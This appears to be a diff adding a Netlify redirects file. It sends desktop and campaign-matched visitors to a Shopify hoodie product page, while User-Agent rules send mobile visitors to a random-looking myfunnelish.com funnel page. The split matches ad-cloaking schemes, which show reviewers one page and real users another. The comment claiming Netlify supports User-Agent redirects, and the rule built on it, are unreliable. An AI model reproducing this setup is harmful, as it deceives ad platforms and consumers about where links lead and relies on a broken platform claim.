@@ -1,0 +1,9 @@
+# Redirect if UTM campaign matches
+/      https://workwear-express-online.myshopify.com/collections/hooded-tops/products/jbs-3cfh-contrast-fleecy-hoodie?variant=43854643888315 302! Query:utm_campaign=__AID_NAME__
+
+# Redirect mobile users (User-Agent detection)
+# Netlify supports device-based redirections!
+/      https://suqiqwopzxkasuewq.myfunnelish.com/tt-ss-hh-pp 302! User-Agent=android|iphone|webos|blackberry|iemobile|opera mini
+
+# Default Redirect (Desktop & Non-Matching Cases)
+/      https://workwear-express-online.myshopify.com/collections/hooded-tops/products/jbs-3cfh-contrast-fleecy-hoodie?variant=43854643888315 302!
